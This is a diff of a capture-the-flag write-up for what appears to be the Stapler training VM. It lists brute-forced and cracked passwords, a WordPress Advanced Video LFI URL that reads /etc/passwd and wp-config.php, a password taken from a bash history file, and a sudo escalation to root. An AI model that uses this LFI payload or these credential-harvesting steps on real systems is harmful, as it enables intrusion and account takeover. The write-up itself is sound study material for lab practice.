@@ -73,25 +73,26 @@
 
 #### passwords
 
-| Creds               | how did i get it   | what can it access/info  |
-|---------------------|--------------------|--------------------------|
-| SHayslett:SHayslett | ssh brute          | ssh user                 |
-| elly:ylle           | ftp brute          | ftp 'power' user <br> (ssh-> su) user |
-| harry:monkey        | wp brute           |                          |
-| garry:football      | wp brute           |                          |
-| harry:monkey        | wp brute           |                          |
-| scott:cookie        | wp brute           |                          |
-| kathy:coolgirl      | wp brute           |                          |
-| john:incorrect      | wp brute           | wp admin                 |
-| root:plbkac         | LFI->wp-config.php | root on mysql/phpmyadmin |
-| barry:washere       | dbdump->hashcat    | |
-| heather:passphras   | dbdump->hashcat    | |
-| tim:thumb           | dbdump->hashcat    | |
-| ZOE:partyqueen      | dbdump->hashcat    | |
-| dave:damachine      | dbdump->hashcat    | |
-| simon:TOM           | dbdump->hashcat    | |
+| Creds               | how did i get it      | what can it access/info  |
+|---------------------|-----------------------|--------------------------|
+| SHayslett:SHayslett | ssh brute             | ssh user                 |
+| elly:ylle           | ftp brute             | ftp 'power' user <br> (ssh-> su) user |
+| harry:monkey        | wp brute              |                          |
+| garry:football      | wp brute              |                          |
+| harry:monkey        | wp brute              |                          |
+| scott:cookie        | wp brute              |                          |
+| kathy:coolgirl      | wp brute              |                          |
+| john:incorrect      | wp brute              | wp admin                 |
+| root:plbkac         | LFI->wp-config.php    | root on mysql/phpmyadmin |
+| barry:washere       | dbdump->hashcat       | |
+| heather:passphras   | dbdump->hashcat       | |
+| tim:thumb           | dbdump->hashcat       | |
+| ZOE:partyqueen      | dbdump->hashcat       | |
+| dave:damachine      | dbdump->hashcat       | |
+| simon:TOM           | dbdump->hashcat       | |
 | pam:0520            | dbdump->hashcat <br> info on site (birthday) | |
-| mike:12345          | dbdump->hashcat    | found in 'loot' db
+| mike:12345          | dbdump->hashcat       | found in 'loot' db
+| peter:JZQuyIN5      | found in history file |
 
 #### hashes
 
@@ -2144,9 +2145,9 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-01-06 18:31:
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-01-06 18:55:23
 ``` 
 
-### Exploit
+## Exploit
 
-#### ssh - SHayslett@red
+### ssh - SHayslett@red
 
 lower priv shell
 
@@ -2163,11 +2164,11 @@ SHayslett@192.168.56.101's password:
 Welcome back!
 ```
 
-#### FTP - elly
+### FTP - elly
 
 grabbed some config files and passwd. see loot/ftp.
 
-#### Advanced Video 1.0 
+### Advanced Video 1.0 
 
 ```
 https://192.168.56.101:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=../../../../../../../../etc/passwd
@@ -2189,7 +2190,7 @@ Index of /blogblog/wp-content/uploads
 Apache/2.4.18 (Ubuntu) Server at 192.168.56.101 Port 12380
 ```
 
-##### wp-config
+#### wp-config
 
 ```
 define('DB_NAME', 'wordpress');
@@ -2201,7 +2202,7 @@ define('DB_USER', 'root');
 define('DB_PASSWORD', 'plbkac');
 ```
 
-###### phpmyadmin
+##### phpmyadmin
 
 Exported all usernames/hashes. See loot/sql folder.
 
@@ -2233,13 +2234,13 @@ select '<!-- By justin-p (https://github.com/justin-p) based of https://github.c
 ```
 
 
-#### wordpress admin
+### wordpress admin
 
 upload shell as a 'plugin'
 
-### Post Exploit
+## Post Exploit
 
-#### ssh - SHayslett@red
+### ssh - SHayslett@red
 
 ```
 SHayslett@red:~$ ls -la
@@ -2288,4 +2289,461 @@ su: Authentication failure
 SHayslett@red:~$ su root
 Password: plbkac
 su: Authentication failure
+SHayslett@red:/home$ ls -la -R
+.:
+total 128
+drwxr-xr-x 32 root       root       4096 Jun  4  2016 .
+drwxr-xr-x 22 root       root       4096 Jun  7  2016 ..
+drwxr-xr-x  2 AParnell   AParnell   4096 Jun  5  2016 AParnell
+drwxr-xr-x  2 CCeaser    CCeaser    4096 Jun  5  2016 CCeaser
+drwxr-xr-x  2 CJoo       CJoo       4096 Jun  5  2016 CJoo
+drwxr-xr-x  2 Drew       Drew       4096 Jun  5  2016 Drew
+drwxr-xr-x  2 DSwanger   DSwanger   4096 Jun  5  2016 DSwanger
+drwxr-xr-x  2 Eeth       Eeth       4096 Jun  5  2016 Eeth
+drwxr-xr-x  2 elly       elly       4096 Jun  5  2016 elly
+drwxr-xr-x  2 ETollefson ETollefson 4096 Jun  5  2016 ETollefson
+drwxr-xr-x  2 IChadwick  IChadwick  4096 Jun  5  2016 IChadwick
+drwxr-xr-x  2 jamie      jamie      4096 Jun  5  2016 jamie
+drwxr-xr-x  2 JBare      JBare      4096 Jun  5  2016 JBare
+drwxr-xr-x  2 jess       jess       4096 Jun  5  2016 jess
+drwxr-xr-x  2 JKanode    JKanode    4096 Jun  5  2016 JKanode                                                                                                                            
+drwxr-xr-x  2 JLipps     JLipps     4096 Jun  5  2016 JLipps                                                                                                                             
+drwxr-xr-x  2 kai        kai        4096 Jun  5  2016 kai                                                                                                                                
+drwxr-xr-x  2 LSolum     LSolum     4096 Jun  5  2016 LSolum                                                                                                                             
+drwxr-xr-x  2 LSolum2    LSolum2    4096 Jun  5  2016 LSolum2                                                                                                                            
+drwxr-xr-x  2 MBassin    MBassin    4096 Jun  5  2016 MBassin                                                                                                                            
+drwxr-xr-x  2 mel        mel        4096 Jun  5  2016 mel                                                                                                                                
+drwxr-xr-x  2 MFrei      MFrei      4096 Jun  5  2016 MFrei                                                                                                                              
+drwxr-xr-x  2 NATHAN     NATHAN     4096 Jun  5  2016 NATHAN                                                                                                                             
+drwxr-xr-x  3 peter      peter      4096 Jun  3  2016 peter                                                                                                                              
+drwxr-xr-x  2 RNunemaker RNunemaker 4096 Jun  5  2016 RNunemaker                                                                                                                         
+drwxr-xr-x  2 Sam        Sam        4096 Jun  5  2016 Sam                                                                                                                                
+drwxr-xr-x  2 SHAY       SHAY       4096 Jun  5  2016 SHAY                                                                                                                               
+drwxr-xr-x  3 SHayslett  SHayslett  4096 Jan  6 20:58 SHayslett                                                                                                                          
+drwxr-xr-x  2 SStroud    SStroud    4096 Jun  5  2016 SStroud                                                                                                                            
+drwxr-xr-x  2 Taylor     Taylor     4096 Jun  5  2016 Taylor                                                                                                                             
+drwxrwxrwx  2 www        www        4096 Jun  5  2016 www                                                                                                                                
+drwxr-xr-x  2 zoe        zoe        4096 Jun  5  2016 zoe                                                                                                                                
+                                                                                                                                                                                         
+./AParnell:                                                                                                                                                                              
+total 24                                                                                                                                                                                 
+drwxr-xr-x  2 AParnell AParnell 4096 Jun  5  2016 .                                                                                                                                      
+drwxr-xr-x 32 root     root     4096 Jun  4  2016 ..                                                                                                                                     
+-rw-r--r--  1 root     root        5 Jun  5  2016 .bash_history                                                                                                                          
+-rw-r--r--  1 AParnell AParnell  220 Sep  1  2015 .bash_logout                                                                                                                           
+-rw-r--r--  1 AParnell AParnell 3771 Sep  1  2015 .bashrc                                                                                                                                
+-rw-r--r--  1 AParnell AParnell  675 Sep  1  2015 .profile                                                                                                                               
+                                                                                                                                                                                         
+./CCeaser:                                                                                                                                                                               
+total 24                                                                                                                                                                                 
+drwxr-xr-x  2 CCeaser CCeaser 4096 Jun  5  2016 .                                                                                                                                        
+drwxr-xr-x 32 root    root    4096 Jun  4  2016 ..                                                                                                                                       
+-rw-r--r--  1 root    root      10 Jun  5  2016 .bash_history
+-rw-r--r--  1 CCeaser CCeaser  220 Sep  1  2015 .bash_logout
+-rw-r--r--  1 CCeaser CCeaser 3771 Sep  1  2015 .bashrc
+-rw-r--r--  1 CCeaser CCeaser  675 Sep  1  2015 .profile
+
+./CJoo:
+total 24
+drwxr-xr-x  2 CJoo CJoo 4096 Jun  5  2016 .
+drwxr-xr-x 32 root root 4096 Jun  4  2016 ..
+-rw-r--r--  1 root root    5 Jun  5  2016 .bash_history
+-rw-r--r--  1 CJoo CJoo  220 Sep  1  2015 .bash_logout
+-rw-r--r--  1 CJoo CJoo 3771 Sep  1  2015 .bashrc
+-rw-r--r--  1 CJoo CJoo  675 Sep  1  2015 .profile
+
+./Drew:
+total 24
+drwxr-xr-x  2 Drew Drew 4096 Jun  5  2016 .
+drwxr-xr-x 32 root root 4096 Jun  4  2016 ..
+-rw-r--r--  1 root root    5 Jun  5  2016 .bash_history
+-rw-r--r--  1 Drew Drew  220 Sep  1  2015 .bash_logout
+-rw-r--r--  1 Drew Drew 3771 Sep  1  2015 .bashrc
+-rw-r--r--  1 Drew Drew  675 Sep  1  2015 .profile
+
+./DSwanger:
+total 24
+drwxr-xr-x  2 DSwanger DSwanger 4096 Jun  5  2016 .
+drwxr-xr-x 32 root     root     4096 Jun  4  2016 ..
+-rw-r--r--  1 root     root        5 Jun  5  2016 .bash_history
+-rw-r--r--  1 DSwanger DSwanger  220 Sep  1  2015 .bash_logout
+-rw-r--r--  1 DSwanger DSwanger 3771 Sep  1  2015 .bashrc
+-rw-r--r--  1 DSwanger DSwanger  675 Sep  1  2015 .profile
+
+./Eeth:
+total 24
+drwxr-xr-x  2 Eeth Eeth 4096 Jun  5  2016 .
+drwxr-xr-x 32 root root 4096 Jun  4  2016 ..
+-rw-r--r--  1 root root    5 Jun  5  2016 .bash_history
+-rw-r--r--  1 Eeth Eeth  220 Sep  1  2015 .bash_logout
+-rw-r--r--  1 Eeth Eeth 3771 Sep  1  2015 .bashrc
+-rw-r--r--  1 Eeth Eeth  675 Sep  1  2015 .profile
+
+./elly:
+total 24
+drwxr-xr-x  2 elly elly 4096 Jun  5  2016 .
+drwxr-xr-x 32 root root 4096 Jun  4  2016 ..
+-rw-r--r--  1 root root    5 Jun  5  2016 .bash_history
+-rw-r--r--  1 elly elly  220 Sep  1  2015 .bash_logout
+-rw-r--r--  1 elly elly 3771 Sep  1  2015 .bashrc
+-rw-r--r--  1 elly elly  675 Sep  1  2015 .profile
+
+./ETollefson:
+total 24
+drwxr-xr-x  2 ETollefson ETollefson 4096 Jun  5  2016 .
+drwxr-xr-x 32 root       root       4096 Jun  4  2016 ..
+-rw-r--r--  1 root       root          5 Jun  5  2016 .bash_history
+-rw-r--r--  1 ETollefson ETollefson  220 Sep  1  2015 .bash_logout
+-rw-r--r--  1 ETollefson ETollefson 3771 Sep  1  2015 .bashrc
+-rw-r--r--  1 ETollefson ETollefson  675 Sep  1  2015 .profile
+
+./IChadwick:
+total 24
+drwxr-xr-x  2 IChadwick IChadwick 4096 Jun  5  2016 .
+drwxr-xr-x 32 root      root      4096 Jun  4  2016 ..
+-rw-r--r--  1 root      root         5 Jun  5  2016 .bash_history
+-rw-r--r--  1 IChadwick IChadwick  220 Sep  1  2015 .bash_logout
+-rw-r--r--  1 IChadwick IChadwick 3771 Sep  1  2015 .bashrc
+-rw-r--r--  1 IChadwick IChadwick  675 Sep  1  2015 .profile
+
+./jamie:
+total 24
+drwxr-xr-x  2 jamie jamie 4096 Jun  5  2016 .
+drwxr-xr-x 32 root  root  4096 Jun  4  2016 ..
+-rw-r--r--  1 root  root    16 Jun  5  2016 .bash_history
+-rw-r--r--  1 jamie jamie  220 Sep  1  2015 .bash_logout
+-rw-r--r--  1 jamie jamie 3771 Sep  1  2015 .bashrc
+-rw-r--r--  1 jamie jamie  675 Sep  1  2015 .profile
+
+./JBare:
+total 24
+drwxr-xr-x  2 JBare JBare 4096 Jun  5  2016 .
+drwxr-xr-x 32 root  root  4096 Jun  4  2016 ..
+-rw-r--r--  1 root  root     5 Jun  5  2016 .bash_history
+-rw-r--r--  1 JBare JBare  220 Sep  1  2015 .bash_logout
+-rw-r--r--  1 JBare JBare 3771 Sep  1  2015 .bashrc
+-rw-r--r--  1 JBare JBare  675 Sep  1  2015 .profile
+
+./jess:
+total 24
+drwxr-xr-x  2 jess jess 4096 Jun  5  2016 .
+drwxr-xr-x 32 root root 4096 Jun  4  2016 ..
+-rw-r--r--  1 root root    5 Jun  5  2016 .bash_history
+-rw-r--r--  1 jess jess  220 Sep  1  2015 .bash_logout
+-rw-r--r--  1 jess jess 3771 Sep  1  2015 .bashrc
+-rw-r--r--  1 jess jess  675 Sep  1  2015 .profile
+
+./JKanode:
+total 24
+drwxr-xr-x  2 JKanode JKanode 4096 Jun  5  2016 .
+drwxr-xr-x 32 root    root    4096 Jun  4  2016 ..
+-rw-r--r--  1 JKanode JKanode  167 Jun  5  2016 .bash_history
+-rw-r--r--  1 JKanode JKanode  220 Sep  1  2015 .bash_logout
+-rw-r--r--  1 JKanode JKanode 3771 Sep  1  2015 .bashrc
+-rw-r--r--  1 JKanode JKanode  675 Sep  1  2015 .profile
+
+./JLipps:
+total 24
+drwxr-xr-x  2 JLipps JLipps 4096 Jun  5  2016 .
+drwxr-xr-x 32 root   root   4096 Jun  4  2016 ..
+-rw-r--r--  1 root   root     10 Jun  5  2016 .bash_history
+-rw-r--r--  1 JLipps JLipps  220 Sep  1  2015 .bash_logout
+-rw-r--r--  1 JLipps JLipps 3771 Sep  1  2015 .bashrc
+-rw-r--r--  1 JLipps JLipps  675 Sep  1  2015 .profile
+
+./kai:
+total 24
+drwxr-xr-x  2 kai  kai  4096 Jun  5  2016 .
+drwxr-xr-x 32 root root 4096 Jun  4  2016 ..
+-rw-r--r--  1 root root    5 Jun  5  2016 .bash_history
+-rw-r--r--  1 kai  kai   220 Sep  1  2015 .bash_logout
+-rw-r--r--  1 kai  kai  3771 Sep  1  2015 .bashrc
+-rw-r--r--  1 kai  kai   675 Sep  1  2015 .profile
+
+./LSolum:
+total 24
+drwxr-xr-x  2 LSolum LSolum 4096 Jun  5  2016 .
+drwxr-xr-x 32 root   root   4096 Jun  4  2016 ..
+-rw-r--r--  1 root   root      5 Jun  5  2016 .bash_history
+-rw-r--r--  1 LSolum LSolum  220 Sep  1  2015 .bash_logout
+-rw-r--r--  1 LSolum LSolum 3771 Sep  1  2015 .bashrc
+-rw-r--r--  1 LSolum LSolum  675 Sep  1  2015 .profile
+
+./LSolum2:
+total 24
+drwxr-xr-x  2 LSolum2 LSolum2 4096 Jun  5  2016 .
+drwxr-xr-x 32 root    root    4096 Jun  4  2016 ..
+-rw-r--r--  1 root    root      12 Jun  5  2016 .bash_history
+-rw-r--r--  1 LSolum2 LSolum2  220 Sep  1  2015 .bash_logout
+-rw-r--r--  1 LSolum2 LSolum2 3771 Sep  1  2015 .bashrc
+-rw-r--r--  1 LSolum2 LSolum2  675 Sep  1  2015 .profile
+
+./MBassin:
+total 24
+drwxr-xr-x  2 MBassin MBassin 4096 Jun  5  2016 .
+drwxr-xr-x 32 root    root    4096 Jun  4  2016 ..
+-rw-r--r--  1 root    root       5 Jun  5  2016 .bash_history
+-rw-r--r--  1 MBassin MBassin  220 Sep  1  2015 .bash_logout
+-rw-r--r--  1 MBassin MBassin 3771 Sep  1  2015 .bashrc
+-rw-r--r--  1 MBassin MBassin  675 Sep  1  2015 .profile
+
+./mel:
+total 24
+drwxr-xr-x  2 mel  mel  4096 Jun  5  2016 .
+drwxr-xr-x 32 root root 4096 Jun  4  2016 ..
+-rw-r--r--  1 root root    5 Jun  5  2016 .bash_history
+-rw-r--r--  1 mel  mel   220 Sep  1  2015 .bash_logout
+-rw-r--r--  1 mel  mel  3771 Sep  1  2015 .bashrc
+-rw-r--r--  1 mel  mel   675 Sep  1  2015 .profile
+
+./MFrei:
+total 24
+drwxr-xr-x  2 MFrei MFrei 4096 Jun  5  2016 .
+drwxr-xr-x 32 root  root  4096 Jun  4  2016 ..
+-rw-r--r--  1 root  root     5 Jun  5  2016 .bash_history
+-rw-r--r--  1 MFrei MFrei  220 Sep  1  2015 .bash_logout
+-rw-r--r--  1 MFrei MFrei 3771 Sep  1  2015 .bashrc
+-rw-r--r--  1 MFrei MFrei  675 Sep  1  2015 .profile
+
+./NATHAN:
+total 24
+drwxr-xr-x  2 NATHAN NATHAN 4096 Jun  5  2016 .
+drwxr-xr-x 32 root   root   4096 Jun  4  2016 ..
+-rw-r--r--  1 root   root      5 Jun  5  2016 .bash_history
+-rw-r--r--  1 NATHAN NATHAN  220 Sep  1  2015 .bash_logout
+-rw-r--r--  1 NATHAN NATHAN 3771 Sep  1  2015 .bashrc
+-rw-r--r--  1 NATHAN NATHAN  675 Sep  1  2015 .profile
+
+./peter:
+total 72
+drwxr-xr-x  3 peter peter  4096 Jun  3  2016 .
+drwxr-xr-x 32 root  root   4096 Jun  4  2016 ..
+-rw-------  1 peter peter     1 Jun  5  2016 .bash_history
+-rw-r--r--  1 peter peter   220 Jun  3  2016 .bash_logout
+-rw-r--r--  1 peter peter  3771 Jun  3  2016 .bashrc
+drwx------  2 peter peter  4096 Jun  6  2016 .cache
+-rw-r--r--  1 peter peter   675 Jun  3  2016 .profile
+-rw-r--r--  1 peter peter     0 Jun  3  2016 .sudo_as_admin_successful
+-rw-------  1 peter peter   577 Jun  3  2016 .viminfo
+-rw-rw-r--  1 peter peter 39206 Jun  3  2016 .zcompdump
+ls: cannot open directory './peter/.cache': Permission denied
+
+./RNunemaker:
+total 24
+drwxr-xr-x  2 RNunemaker RNunemaker 4096 Jun  5  2016 .
+drwxr-xr-x 32 root       root       4096 Jun  4  2016 ..
+-rw-r--r--  1 root       root          5 Jun  5  2016 .bash_history
+-rw-r--r--  1 RNunemaker RNunemaker  220 Sep  1  2015 .bash_logout
+-rw-r--r--  1 RNunemaker RNunemaker 3771 Sep  1  2015 .bashrc
+-rw-r--r--  1 RNunemaker RNunemaker  675 Sep  1  2015 .profile
+
+./Sam:
+total 24
+drwxr-xr-x  2 Sam  Sam  4096 Jun  5  2016 .
+drwxr-xr-x 32 root root 4096 Jun  4  2016 ..
+-rw-r--r--  1 root root    5 Jun  5  2016 .bash_history
+-rw-r--r--  1 Sam  Sam   220 Sep  1  2015 .bash_logout
+-rw-r--r--  1 Sam  Sam  3771 Sep  1  2015 .bashrc
+-rw-r--r--  1 Sam  Sam   675 Sep  1  2015 .profile
+
+./SHAY:
+total 24
+drwxr-xr-x  2 SHAY SHAY 4096 Jun  5  2016 .
+drwxr-xr-x 32 root root 4096 Jun  4  2016 ..
+-rw-r--r--  1 root root    5 Jun  5  2016 .bash_history
+-rw-r--r--  1 SHAY SHAY  220 Sep  1  2015 .bash_logout
+-rw-r--r--  1 SHAY SHAY 3771 Sep  1  2015 .bashrc
+-rw-r--r--  1 SHAY SHAY  675 Sep  1  2015 .profile
+
+./SHayslett:
+total 28
+drwxr-xr-x  3 SHayslett SHayslett 4096 Jan  6 20:58 .
+drwxr-xr-x 32 root      root      4096 Jun  4  2016 ..
+-rw-r--r--  1 root      root         5 Jun  5  2016 .bash_history
+-rw-r--r--  1 SHayslett SHayslett  220 Sep  1  2015 .bash_logout
+-rw-r--r--  1 SHayslett SHayslett 3771 Sep  1  2015 .bashrc
+drwx------  2 SHayslett SHayslett 4096 Jan  6 20:58 .cache
+-rw-r--r--  1 SHayslett SHayslett  675 Sep  1  2015 .profile
+
+./SHayslett/.cache:
+total 8
+drwx------ 2 SHayslett SHayslett 4096 Jan  6 20:58 .
+drwxr-xr-x 3 SHayslett SHayslett 4096 Jan  6 20:58 ..
+-rw-r--r-- 1 SHayslett SHayslett    0 Jan  6 20:58 motd.legal-displayed
+
+./SStroud:
+total 24
+drwxr-xr-x  2 SStroud SStroud 4096 Jun  5  2016 .
+drwxr-xr-x 32 root    root    4096 Jun  4  2016 ..
+-rw-r--r--  1 root    root       5 Jun  5  2016 .bash_history
+-rw-r--r--  1 SStroud SStroud  220 Sep  1  2015 .bash_logout
+-rw-r--r--  1 SStroud SStroud 3771 Sep  1  2015 .bashrc
+-rw-r--r--  1 SStroud SStroud  675 Sep  1  2015 .profile
+
+./Taylor:
+total 24
+drwxr-xr-x  2 Taylor Taylor 4096 Jun  5  2016 .
+drwxr-xr-x 32 root   root   4096 Jun  4  2016 ..
+-rw-r--r--  1 root   root      8 Jun  5  2016 .bash_history
+-rw-r--r--  1 Taylor Taylor  220 Sep  1  2015 .bash_logout
+-rw-r--r--  1 Taylor Taylor 3771 Sep  1  2015 .bashrc
+-rw-r--r--  1 Taylor Taylor  675 Sep  1  2015 .profile
+
+./www:
+total 20
+drwxrwxrwx  2 www  www  4096 Jun  5  2016 .
+drwxr-xr-x 32 root root 4096 Jun  4  2016 ..
+-rw-r--r--  1 www  www   220 Sep  1  2015 .bash_logout
+-rw-r--r--  1 www  www  3771 Sep  1  2015 .bashrc
+-rw-r--r--  1 www  www   675 Sep  1  2015 .profile
+
+./zoe:
+total 24
+drwxr-xr-x  2 zoe  zoe  4096 Jun  5  2016 .
+drwxr-xr-x 32 root root 4096 Jun  4  2016 ..
+-rw-r--r--  1 root root    9 Jun  5  2016 .bash_history
+-rw-r--r--  1 zoe  zoe   220 Sep  1  2015 .bash_logout
+-rw-r--r--  1 zoe  zoe  3771 Sep  1  2015 .bashrc
+-rw-r--r--  1 zoe  zoe   675 Sep  1  2015 .profile
+
+
+SHayslett@red:/home$ netstat -tuln
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State      
+tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:53              0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:8888            0.0.0.0:*               LISTEN     
+tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:666             0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN     
+tcp6       0      0 :::139                  :::*                    LISTEN     
+tcp6       0      0 :::53                   :::*                    LISTEN     
+tcp6       0      0 :::22                   :::*                    LISTEN     
+tcp6       0      0 :::12380                :::*                    LISTEN     
+tcp6       0      0 :::12380                :::*                    LISTEN     
+tcp6       0      0 :::445                  :::*                    LISTEN     
+udp        0      0 192.168.56.255:137      0.0.0.0:*                          
+udp        0      0 192.168.56.101:137      0.0.0.0:*                          
+udp        0      0 0.0.0.0:137             0.0.0.0:*                          
+udp        0      0 192.168.56.255:138      0.0.0.0:*                          
+udp        0      0 192.168.56.101:138      0.0.0.0:*                          
+udp        0      0 0.0.0.0:138             0.0.0.0:*                          
+udp        0      0 0.0.0.0:53              0.0.0.0:*                          
+udp        0      0 0.0.0.0:68              0.0.0.0:*                          
+udp        0      0 0.0.0.0:69              0.0.0.0:*                          
+udp6       0      0 :::53                   :::*                         
+
+SHayslett@red:/home$ ps aux | grep 8888
+SHaysle+  1046  0.0  0.0   5108   764 pts/0    S+   00:35   0:00 grep --color=auto 8888
+root      1339  0.0  0.3   6472  3320 ?        S    Jan06   0:00 su -c cd /home/JKanode; python2 -m SimpleHTTPServer 8888 &>/dev/null JKanode
+JKanode   1363  0.0  0.2   5436  2840 ?        Ss   Jan06   0:00 bash -c cd /home/JKanode; python2 -m SimpleHTTPServer 8888 &>/dev/null
+JKanode   1364  0.0  0.6  14696  6440 ?        S    Jan06   0:06 python2 -m SimpleHTTPServer 8888
+SHayslett@red:/home/JKanode$ cat .bash_history 
+id
+whoami
+ls -lah
+pwd
+ps aux
+sshpass -p thisimypassword ssh JKanode@localhost
+apt-get install sshpass
+sshpass -p JZQuyIN5 peter@localhost
+ps -ef
+top
+kill -9 3747
+exit
+SHayslett@red:/home/JKanode$ exit
+```
+
+## Priv Esc
+
+### ssh peter
+
+```
+root@kali:~/Desktop# ssh peter@192.168.56.101
+-----------------------------------------------------------------
+~          Barry, don't forget to put a message here           ~
+-----------------------------------------------------------------
+peter@192.168.56.101's password: 
+Welcome back!
+
+
+This is the Z Shell configuration function for new users,
+zsh-newuser-install.
+You are seeing this message because you have no zsh startup files
+(the files .zshenv, .zprofile, .zshrc, .zlogin in the directory
+~).  This function can help you with a few settings that should
+make your use of the shell easier.
+
+You can:
+
+(q)  Quit and do nothing.  The function will be run again next time.
+
+(0)  Exit, creating the file ~/.zshrc containing just a comment.
+     That will prevent this function being run again.
+
+(1)  Continue to the main menu.
+
+(2)  Populate your ~/.zshrc with the configuration recommended
+     by the system administrator and exit (you will need to edit
+     the file by hand, if so desired).
+
+--- Type one of the keys in parentheses --- 0
+red% sudo -l
+
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+
+[sudo] password for peter: 
+Matching Defaults entries for peter on red:
+    lecture=always, env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User peter may run the following commands on red:
+    (ALL : ALL) ALL
+red% 
+root@red:~# cd /root/
+root@red:/root# ls -la
+total 208
+drwx------  4 root root  4096 Jan  6 14:46 .
+drwxr-xr-x 22 root root  4096 Jun  7  2016 ..
+-rw-------  1 root root     1 Jun  5  2016 .bash_history
+-rw-r--r--  1 root root  3106 Oct 22  2015 .bashrc
+-rwxr-xr-x  1 root root  1090 Jun  5  2016 fix-wordpress.sh
+-rw-r--r--  1 root root   463 Jun  5  2016 flag.txt
+-rw-r--r--  1 root root   345 Jun  5  2016 issue
+-rw-r--r--  1 root root    50 Jun  3  2016 .my.cnf
+-rw-------  1 root root     1 Jun  5  2016 .mysql_history
+drwxr-xr-x 11 root root  4096 Jun  3  2016 .oh-my-zsh
+-rw-r--r--  1 root root   148 Aug 17  2015 .profile
+-rwxr-xr-x  1 root root   103 Jun  5  2016 python.sh
+-rw-------  1 root root  1024 Jun  5  2016 .rnd
+drwxr-xr-x  2 root root  4096 Jun  4  2016 .vim
+-rw-------  1 root root     1 Jun  5  2016 .viminfo
+-rw-r--r--  1 root root 54405 Jun  5  2016 wordpress.sql
+-rw-r--r--  1 root root 39206 Jun  3  2016 .zcompdump
+-rw-r--r--  1 root root 39352 Jun  3  2016 .zcompdump-red-5.1.1
+-rw-------  1 root root    39 Jun  5  2016 .zsh_history
+-rw-r--r--  1 root root  2839 Jun  3  2016 .zshrc
+-rw-r--r--  1 root root    17 Jun  3  2016 .zsh-update
+root@red:/root# cat flag.txt 
+~~~~~~~~~~<(Congratulations)>~~~~~~~~~~
+                          .-'''''-.
+                          |'-----'|
+                          |-.....-|
+                          |       |
+                          |       |
+         _,._             |       |
+    __.o`   o`"-.         |       |
+ .-O o `"-.o   O )_,._    |       |
+( o   O  o )--.-"`O   o"-.`'-----'`
+ '--------'  (   o  O    o)  
+              `----------`
+b6b545dc11b7a270f4bad23432190c75162c4a2b
 ```
